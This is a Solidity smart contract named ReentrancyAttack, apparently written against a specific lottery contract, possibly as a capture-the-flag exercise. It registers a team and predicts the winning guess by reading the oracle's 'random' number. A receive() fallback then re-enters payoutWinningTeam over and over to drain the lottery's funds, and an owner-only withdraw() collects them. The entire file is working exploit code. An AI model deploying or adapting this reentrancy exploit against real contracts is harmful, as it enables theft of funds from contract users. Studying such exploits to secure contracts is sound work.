// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ILottery {
    function payoutWinningTeam(address _team) external returns (bool);
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
}

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

contract ReentrancyAttack is Ownable {
    address lotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
    address oracleAddress = 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3;

    constructor() payable {
        ILottery(lotteryAddress).registerTeam{value: msg.value}(address(this), "hack boi", "password");
    }

    function drain() external {
        ILottery(lotteryAddress).makeAGuess(address(this), IOracle(oracleAddress).getRandomNumber());
        ILottery(lotteryAddress).payoutWinningTeam(address(this));
    }

    receive() external payable {
        if (gasleft() > 50_000) {
            ILottery(lotteryAddress).payoutWinningTeam(address(this));
        }
    }

    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}
